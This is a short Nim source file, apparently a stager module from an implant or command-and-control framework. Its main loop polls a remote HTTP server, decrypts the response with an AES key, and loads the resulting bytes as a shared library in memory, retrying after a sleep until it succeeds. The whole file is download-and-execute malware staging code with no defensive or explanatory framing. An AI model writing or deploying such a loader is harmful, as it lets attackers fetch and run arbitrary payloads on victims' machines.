import ../utils/global
import ../capabilities/sleep
import ../utils/stage
import ../utils/crypt/transport
import ../utils/network/http_core

proc toBytes(body: string): seq[byte] =
  # Converts a string body into a sequence of bytes
  result = newSeq[byte](body.len)
  if body.len > 0:
    copyMem(addr result[0], addr body[0], body.len)

proc payloadFromResponse(raw: string): seq[byte] =
  # Decrypts the raw response and returns the payload bytes
  var text = tryCryptDecrypt(aesKey, raw)
  if text.len == 0 and raw.len > 0:
    text = raw
  toBytes(text)

proc main*(): void =
  # Main loop that fetches the payload and runs the shared library
  while true:
    let resp = http_core.httpGetRaw()
    if resp.ok and resp.code == 200 and resp.body.len > 0:
      let payload = payloadFromResponse(resp.body)
      if payload.len > 0:
        runSharedLibrary(payload)
        return
    sleep_now()
